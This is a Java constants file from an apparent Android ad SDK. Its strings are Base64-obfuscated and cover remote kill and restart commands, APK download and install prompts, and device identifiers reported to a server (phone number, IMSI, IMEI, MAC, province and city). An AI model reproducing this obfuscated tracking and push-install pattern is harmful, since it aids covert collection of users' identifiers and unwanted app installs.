package com.jv.code.api;

import com.jv.code.utils.Base64;

/**
 * Created by Administrator on 2017/4/20.
 */

public class Constant {

    //服务指令
    public static final String STOP_SERVICE_RECEIVER = getString("Yy5hLncuc3RvcC5hY3Rpb24=");//关闭主服务 action  c.a.w.stop.action
    public static final String RE_START_RECEIVER = getString("Yy5hLncucmVzdGFydC5hY3Rpb24="); //重启SDK action  c.a.w.restart.action
    public static final String SDK_INIT_ALL = getString("Yy5hLncuaW5pdC5hY3Rpb24=");//全局初始化成功  c.a.w.init.action

    //广播注册
    public static final String DOWNLOAD_COMPLETE = getString("RG93bmxvYWRNYW5hZ2VyLkFDVElPTl9ET1dOTE9BRF9DT01QTEVURQ=="); // DownloadManager.ACTION_DOWNLOAD_COMPLETE
    public static final String MANAGER_DOWNLOAD_COMPLETE = getString("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLkRPV05MT0FEX0NPTVBMRVRF"); //android.intent.action.DOWNLOAD_COMPLETE
    public static final String NOTIFICATION_CLICKED = getString("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLkRPV05MT0FEX05PVElGSUNBVElPTl9DTElDS0VE");//android.intent.action.DOWNLOAD_NOTIFICATION_CLICKED
    public static final String PACKAGE_ADDED = getString("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlBBQ0tBR0VfQURERUQ="); // android.intent.action.PACKAGE_ADDED
    public static final String PACKAGE_REMOVED = getString("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLlBBQ0tBR0VfUkVNT1ZFRA=="); // android.intent.action.PACKAGE_REMOVED
    public static final String PACKAGE = getString("cGFja2FnZQ=="); // package

    public static final String EXTRA_DOWNLOAD_ID = getString("ZXh0cmFfZG93bmxvYWRfaWQ=");  //DownloadManager.EXTRA_DOWNLOAD_ID  extra_download_id
    public static final String DOWNLOAD_SERVICE = getString("ZG93bmxvYWQ="); // download
    public static final String COLUMN_LOCAL_FILENAME = getString("bG9jYWxfZmlsZW5hbWU="); // DownloadManager.COLUMN_LOCAL_FILENAME  local_filename
    public static final String APK_URI_ADDRESS = getString("YXBwbGljYXRpb24vdm5kLmFuZHJvaWQucGFja2FnZS1hcmNoaXZl"); // application/vnd.android.package-archive
    public static final String APK_URI_FILE = getString("ZmlsZTovLw=="); // file://

    //首次启动sdk 代码 启动发送设备信息 sp唯一标识KEY
    public static final String FIST_RUN_SDK = getString("ZmlzdF9mdW5fc2Rr"); // fist_fun_sdk

    public static final String SERVICE_TIME = getString("c2VydmljZVRpbWU=");//服务存活时间  serviceTime

    //广告类型
    public static final String BANNER_TYPE = getString("YmFubmVy"); // banner
    public static final String SCREEN_TYPE = getString("5o+S5bGP"); // 插屏
    public static final String APK_TYPE = getString("YXBr"); // apk

    public static final String SHOW_TIME_COUNT_PREF_PREFIX = getString("c2hvd190aW1lc19wcmVmX3ByZWZpeA==");// 记录每天显示的常量 会在后面拼接 年+天  "show_times_pref_prefix"
    public static final String DOWNLOAD_PREF = getString("bm90aWZpY2F0aW9uX2Rvd25sb2Fkcw=="); //下载任务通知键  "notification_downloads"

    public static final String SEND_SERVICE_STATE = getString("5ZCR5pyN5Yqh5Zmo5o6o6YCB54q25oCB"); // "向服务器推送状态"
    public static final String SEND_SERVICE_STATE_SUCCESS = getString("5o6o6YCB5oiQ5Yqf");  // "推送成功"
    public static final String SEND_SERVICE_STATE_ERROR = getString("5o6o6YCB5aSx6LSl");  // "推送失败"

    /**
     * 网络请求
     */
    public static final int CONNECT_TIME_OUT = 30000;// 连接超时的时长
    public static final int READ_TIME_OUT = 30000;// 读取超时的时长
    public static final int MAX_REQUEST = 1;//网络请求失败后 最大重复请求数
    public static boolean CLOSE_SERVICE = false;

    /**
     * 命令参数
     */
    public static final String AUTO_START_SERVICE = getString("YXV0b1N0YXJ0U2VydmljZQ=="); //true 关闭自动启动 false 关闭不再启动  autoStartService
    public static final String KILL_SERVICE = getString("a2lsbFNlcnZpY2U="); //当前为true 杀死服务  killService
    public static final String KILL_START_SERVICE = getString("a2lsbFN0YXJ0U2VydmljZQ=="); // 重启服务 更新代码 true  killStartService
    public static final String LOG_ENABLED = getString("bG9nRW5hYmxlZA=="); // true 打开日志  logEnabled


    /**
     * 配置参数
     */
    public static final String SIM = getString("c2lt");//手机号码  sim
    public static final String USER_ID = getString("dXNlcklk");//userId
    public static final String IMSI = getString("aW1zaQ==");// IMSI码，服务器是1  imsi
    public static final String IMEI = getString("aW1laQ==");// IMEI码，服务器是1  imei
    public static final String TIME_TAMP = getString("dGltZXN0YW1w");//时间戳  timestamp
    public static final String PACKAGE_NAME = getString("cGFja2FnZU5hbWU=");//包名  packageName
    public static final String APPLICATION_NAME = getString("YXBwbGljYXRpb25OYW1l");//应用名称  applicationName
    public static final String APPLICATION_VERSION = getString("YXBwbGljYXRpb25WZXJzaW9u");//应用版本  applicationVersion
    public static final String WIFI_MAC = getString("bWFj");  // mac
    public static final String OS_VERSION = getString("b3NfdmVyc2lvbg==");// 操作系统的版本，服务器是3  os_version
    public static final String COMPANY = getString("Y29tcGFueQ==");// 手机设备的制造商，服务器是4  company
    public static final String MODEL = getString("bW9kZWw=");// 手机型号，服务器是5  model
    public static final String SCREEN_WIDTH = getString("c2NyZWVuV2lkdGg=");// 手机屏幕宽度，服务器是6  screenWidth
    public static final String SCREEN_HEIGHT = getString("c2NyZWVuSGVpZ2h0");// 手机屏幕高度，服务器是7  screenHeight
    public static final String SCREEN_DPI = getString("c2NyZWVuRHBp");// 手机屏幕分辨率，服务器是8  screenDpi
    public static final String SHUCK_VERSION = getString("c2h1Y2tWZXJzaW9u"); //壳子版本  shuckVersion
    public static final String SHUCK_NAME = getString("c2h1Y2tOYW1l"); //壳子名称  shuckName
    public static final String JAR_VERSION = getString("amFyVmVyc2lvbg=="); //jar版本  jarVersion
    public static final String JAR_NAME = getString("amFyTmFtZQ==");  // jarName
    public static final String PROVINCE = getString("cHJvdmluY2U=");//省  province
    public static final String CITY = getString("Y2l0eQ==");//市  city
    public static final String IP_INFO = getString("aXBJbmZv"); //ip请求 数据  ipInfo


    /**
     * 广告配置信息
     */
    public static final String SHOW_LIMIT = getString("c2hvd0xpbWl0");// 广告最大显示数  showLimit
    public static final String CONFIG_VERSION = getString("Y29uZmlnVmVyc2lvbg==");// 当前配置版本  configVersion
    public static final String BANNER_FIRST_TIME = getString("YmFubmVyRmlyc3RUaW1l");// banner 首次启动时间  bannerFirstTime
    public static final String BANNER_SHOW_TIME = getString("YmFubmVyU2hvd1RpbWU=");// banner 点击广告间隔时间  bannerShowTime
    public static final String BANNER_END_TIME = getString("YmFubmVyRW5kVGltZQ==");// banner 点击关闭间隔时间  bannerEndTime
    public static final String BANNER_ENABLED = getString("YmFubmVyRW5hYmxlZA==");// banner 显示类型  bannerEnabled
    public static final String BANNER_SHOW_COUNT = getString("YmFubmVyU2hvd0NvdW50");// banner 外插显示次数  bannerShowCount
    public static final String BANNER_TIME = getString("YmFubmVyVGltZQ==");// banner 当前间隔时间容器  bannerTime
    public static final String BANNER_SWITCH_MODE = getString("YmFubmVyU3dpdGNoTW9kZQ=="); //banner 点击关闭时 执行下载还是关闭  bannerSwitchMode
    public static final String SCREEN_FIRST_TIME = getString("c2NyZWVuRmlyc3RUaW1l");// 插屏 首次启动时间  screenFirstTime
    public static final String SCREEN_SHOW_TIME = getString("c2NyZWVuU2hvd1RpbWU=");// 插屏 点击广告间隔时间  screenShowTime
    public static final String SCREEN_END_TIME = getString("c2NyZWVuRW5kVGltZQ==");// 插屏 点击关闭间隔时间  screenEndTime
    public static final String SCREEN_ENABLED = getString("c2NyZWVuRW5hYmxlZA==");// 插屏显示类型  screenEnabled
    public static final String SCREEN_SHOW_COUNT = getString("c2NyZWVuU2hvd0NvdW50");//插屏 外插显示次数  screenShowCount
    public static final String SCREEN_SWITCH_MODE = getString("c2NyZWVuU3dpdGNoTW9kZQ=="); //插屏 点击关闭时执行下载还是关闭  screenSwitchMode
    public static final String SCREEN_TIME = getString("c2NyZWVuVGltZQ==");// 插屏 当前间隔时间容器  screenTime
    public static final String TIP_ENABLED = getString("dGlwRW5hYmxlZA==");//提示安装 开关  tipEnabled
    public static final String START_TIME = getString("c3RhcnRUaW1l");//启动后多久开始 提示安装  startTime
    public static final String INTERVAL_TIME = getString("aW50ZXJ2YWxUaW1l");//提示间隔时间  intervalTime
    public static final String TIP_MODEL = getString("dGlwTW9kbGU="); //提示安装取消指令 动作指令 0是关闭，1是安装  tipModle


    /**
     * 广告展示 状态返回码
     */
    public static final int SHOW_AD_STATE_ADD = 0x0005;
    public static final int SHOW_AD_STATE_DOWNLOAD = 0x0004;
    public static final int SHOW_AD_STATE_CLICK = 0x0003;
    public static final int SHOW_AD_STATE_CLOSE = 0x0002;
    public static final int SHOW_AD_STATE_OK = 0x0001;

    /**
     * 浏览器包名
     */
    public static final String WEBLINK_CLICK_PREF = getString("d2ViX2xpbmtfY2xpY2s=");  // web_link_click
    public static final String UC_BROWSER = getString("Y29tLlVDTW9iaWxl");  //com.UCMobile
    public static final String QQ_BROWSER = getString("Y29tLnRlbmNlbnQubXR0");  //com.tencent.mtt
    public static final String QIHOO_BROWSER = getString("Y29tLnFpaG9vLmJyb3dzZXI=");  //com.qihoo.browser
    public static final String LIEBAO_BROWSER = getString("Y29tLmlqaW5zaGFuLmJyb3dzZXJfZmFzdA=="); //com.ijinshan.browser_fast
    public static final String DEFAULT_BROWSER = getString("Y29tLmFuZHJvaWQuYnJvd3Nlcg==");  //com.android.browser

    public static String getString(String str) {
        return new String(Base64.decode(str)).trim();
    }

}
